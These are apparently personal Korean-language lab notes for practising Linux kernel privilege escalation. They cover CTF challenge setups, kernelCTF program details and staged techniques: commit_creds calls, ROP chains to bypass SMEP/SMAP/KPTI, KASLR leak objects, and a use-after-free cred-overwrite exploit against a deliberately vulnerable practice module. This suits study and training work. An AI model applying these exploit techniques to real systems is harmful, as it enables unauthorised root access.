# kernelCTF / Linux Kernel LPE 연습 환경 설정 및 기법

## 환경 위치
- **작업 디렉토리**: `~/kernelctf/`
- **문서**: `~/kernelctf/README.md` (전체 구조 + 사용법)

---

## 준비된 챌린지 환경

### 1. fasterbox (Google CTF 2024)
- **커널**: Linux 6.10.0-rc1
- **타입**: seccomp sandbox escape
- **위치**: `~/tools/google-ctf/2024/quals/pwn-fasterbox/challenge/`
- **부팅**: `bash ~/kernelctf/scripts/debug_boot.sh`
- **핵심 취약점**: seccomp 필터가 `syscall number > 400`을 전부 허용 (io_uring 3개만 제외)
- **보호기법**: KASLR ON, KPTI OFF, SLAB hardening OFF, SELinux ON, KALLSYMS_ALL ON
- **공격 방향**: syscall >= 401 신규 syscall 남용 또는 futex2/landlock 계열 확인

### 2. gatekey (Google CTF 2020, Jann Horn)
- **커널**: 커스텀 패치 (`gatekey` PKU 보호 메커니즘 추가)
- **타입**: PKU (Protection Keys for Userspace) bypass
- **위치**: `~/tools/google-ctf/2020/quals/pwn-gatekey/`
- **부팅**: `bash ~/tools/google-ctf/2020/quals/pwn-gatekey/launch_qemu.sh`
- **목표**: PKU로 보호된 flagdb 접근

### 3. LPE 연습 환경 (커스텀 UAF 모듈) — 6.17.0
- **커널**: Linux 6.17.0-14-generic (시스템 커널 headers 사용 빌드)
- **bzImage**: `~/kernelctf/kernels/bzImage-6.17.0` (vmlinuz에서 추출)
- **vmlinux**: `~/kernelctf/kernels/vmlinux-6.17.0` (62MB, GDB 심볼)
- **취약 모듈**: `/dev/vulnmod` — Use-After-Free (UAF)
- **보호기법**: KASLR + KPTI + SMEP + SMAP (qemu64,+smep,+smap)
- **부팅**: `bash /tmp/start_qemu.sh` (telnet serial → socat/python으로 접속)
- **접속**: `python3 -c "import socket..."` 또는 `socat - TCP:127.0.0.1:4444`
- **GDB**: `gdb ~/kernelctf/kernels/vmlinux-6.17.0 -ex 'target remote :1234'` (QEMU에 -s -S 추가 시)

---

## kernelCTF 공식 프로그램

- **대상**: Linux kernel LTS (6.1, 6.6), COS (Container-Optimized OS)
- **목표**: LPE exploit → `/dev/sda` 읽기 → flag 획득
- **보상**: $21K (1-day) ~ $91K (0-day + novel technique)
- **제출**: GitHub PR (exploit 코드 공개)
- **환경**: QEMU, KVM 사용 가능

---

## Linux Kernel LPE 단계별 기법

### Phase 1: 기초 (보호기법 없음)
**커널 부팅 옵션**: `nokaslr nopti nosmap nosmep`

```c
// commit_creds(&init_cred) 직접 호출
void escalate() {
    void (*commit_creds)(void*) = (void*)COMMIT_CREDS_ADDR;
    void *init_cred = (void*)INIT_CRED_ADDR;
    commit_creds(init_cred);
}
// /proc/kallsyms에서 주소 읽기 (KASLR OFF 시)
// $ grep -E "commit_creds|init_cred" /proc/kallsyms
```

### Phase 2: SMEP/SMAP 우회
**커널 부팅 옵션**: `nokaslr nopti`

- 유저스페이스 코드 직접 실행 불가 (SMEP)
- 유저스페이스 데이터 직접 접근 불가 (SMAP)
- **기법**: 커널 ROP 체인 구성
  ```
  gadget1: mov rdi, rsp; ret         → rdi = stack ptr
  gadget2: pop rsi; ret              → rsi = init_cred
  gadget3: call commit_creds; ret
  gadget4: swapgs; ret
  gadget5: iretq
  ```
- ROP gadget 검색: `ROPgadget --binary vmlinux --rop`

### Phase 3: KASLR 우회
**정보 누출 기법**:
1. `/proc/kallsyms` (root 필요) 또는 취약점으로 직접 leak
2. `seq_operations` 구조체 leak (kmalloc-32 슬랩)
3. `msg_msg` 구조체를 통한 heap leak
4. `pipe_buffer` 구조체 (pipe_inode_info 포인터)
5. `tty_struct` (ops 포인터 → 커널 base 계산)

```c
// KASLR base 계산 예시
int seq_fd = open("/proc/self/stat", O_RDONLY);  // kmalloc-32 할당
// leak seq_operations->start 포인터
uint64_t kernel_base = leak - SINGLE_START_OFFSET;
```

### Phase 4: 풀 실전 (KASLR + KPTI + SMEP + SMAP)

**주요 커널 오브젝트 활용**:

| 오브젝트 | 슬랩 크기 | 활용 |
|---------|---------|------|
| `pipe_buffer` | kmalloc-1024 | ops 포인터 → 커널 주소 leak |
| `msg_msg` | kmalloc-64 ~ 4096 | 인접 객체 OOB read/write |
| `timerfd_ctx` | kmalloc-256 | UAF 후 재할당 |
| `tty_struct` | kmalloc-1024 | ops 포인터 덮어쓰기 |
| `sk_buff` | 가변 | heap spray용 |
| `user_key_payload` | 가변 | arbitrary size kmalloc |

**KPTI 우회 (signal handler)**:
```c
// kpti trampoline을 이용한 안전한 리턴
// swapgs_restore_regs_and_return_to_usermode 가젯 사용
rop[i++] = kbase + KPTI_TRAMPOLINE;
rop[i++] = 0;  // padding
rop[i++] = 0;  // padding
rop[i++] = (uint64_t)shellcode;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;
```

---

## UAF → cred 덮어쓰기 기본 패턴

```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define VULNMOD_ALLOC  0x1337
#define VULNMOD_FREE   0x1338
#define VULNMOD_WRITE  0x1339

struct op { size_t size; char *data; };

int main() {
    int fd = open("/dev/vulnmod", O_RDWR);

    // 1. cred 크기(192) 슬랩 할당
    struct op o = {.size=192};
    ioctl(fd, VULNMOD_ALLOC, &o);

    // 2. free → 포인터 NULL화 안 됨
    ioctl(fd, VULNMOD_FREE, 0);

    // 3. fork → 자식의 cred 구조체가 같은 슬랩 주소 재사용 기대
    if (fork() == 0) {
        // 자식: cred 할당됨

        // 4. UAF write: uid/gid 0으로 덮어쓰기
        char zero_cred[192] = {0};
        struct op w = {.size=8, .data=zero_cred};  // usage count 유지
        ioctl(fd, VULNMOD_WRITE, &w);

        // 5. 권한 확인
        if (getuid() == 0) {
            execl("/bin/sh", "sh", NULL);
        }
    }
    wait(NULL);
    return 0;
}
```

---

## QEMU 커널 디버깅 GDB 명령어

```bash
# 커널 심볼 로드
(gdb) file ~/kernelctf/kernels/vmlinux-6.1.119-ctf
(gdb) target remote :1234

# 커널 베이스 확인 (KASLR)
(gdb) p &_text

# 슬랩 할당 추적
(gdb) b kmem_cache_alloc
(gdb) b kfree

# cred 구조체 확인
(gdb) p *(struct cred*)$rdi

# 현재 태스크
(gdb) p current->cred->uid

# kallsyms 심볼 검색
(gdb) info address commit_creds
(gdb) info address init_cred
```

---

## 환경 세팅 트러블슈팅 (2026-02-27)

### 커널 빌드 문제
- kernel.org에서 6.1.119 다운로드 10-60KB/s → ~60분 소요 → **포기**
- **해결**: 시스템 커널 6.17.0 headers(`linux-headers-6.17.0-14-generic`) 사용
- vulnmod.ko 빌드: `make -C /lib/modules/$(uname -r)/build M=$PWD modules`

### vmlinuz 추출
- `/boot/vmlinuz-*`는 root-only → `sudo bash -c "cp ..."` 단일 명령
- bzImage 추출: `extract-vmlinux vmlinuz > vmlinux` (binutils의 extract-vmlinux 또는 scripts/extract-vmlinux)

### busybox setpriv 호환성 (중요!)
- BusyBox v1.36.1의 `setpriv`는 `--reuid=VALUE` 미지원
- 지원 플래그: `-d,--dump --nnp,--no-new-privs --inh-caps CAP --ambient-caps CAP`
- `setuidgid` applet도 미포함
- **해결**: 정적 컴파일 `droppriv` 바이너리 사용
  ```c
  // /tmp/droppriv.c
  #include <unistd.h>
  #include <sys/types.h>
  #include <grp.h>
  int main(void) {
      setgroups(0, NULL); setgid(1000); setuid(1000);
      char *argv[] = {"/bin/sh", NULL};
      execv("/bin/sh", argv);
      return 1;
  }
  // gcc -static -o droppriv droppriv.c
  ```
- init에서: `exec setsid /bin/sh -c 'exec /bin/droppriv </dev/ttyS0 >/dev/ttyS0 2>&1'`

### QEMU 포트 충돌
- `-serial telnet:127.0.0.1:4444,server,nowait` 사용 시 이전 QEMU 좀비가 포트 점유
- **해결**: `sudo fuser -k 4444/tcp` 후 재시작
- 좀비 확인: `ss -tlnp | grep 4444`, `pgrep -la qemu`

### QEMU KVM 접근
- kvm 그룹 추가 후 재로그인 필요 (sg kvm 우회 가능)
- Proxmox VM 안에서는 nested virt 필요 (SVM flag)
- **TCG 모드**: KVM 없이도 동작 (느리지만 가능) — `-cpu qemu64,+smep,+smap`

### rootfs 빌드 스크립트
```bash
cd ~/kernelctf/rootfs && find . | cpio -H newc -o 2>/dev/null | gzip -9 > ~/kernelctf/rootfs.cpio.gz
```

## 참고 리소스

- `~/tools/linux-kernel-exploitation/README.md` — 기법 링크 모음
- kernelCTF 공개 writeup: `~/tools/google-ctf-writeups/`
- how2heap (힙 기법): `~/tools/how2heap/`
- PAWNYABLE 커널 튜토리얼: https://pawnyable.cafe/linux-kernel/
- lkmidas 튜토리얼: https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
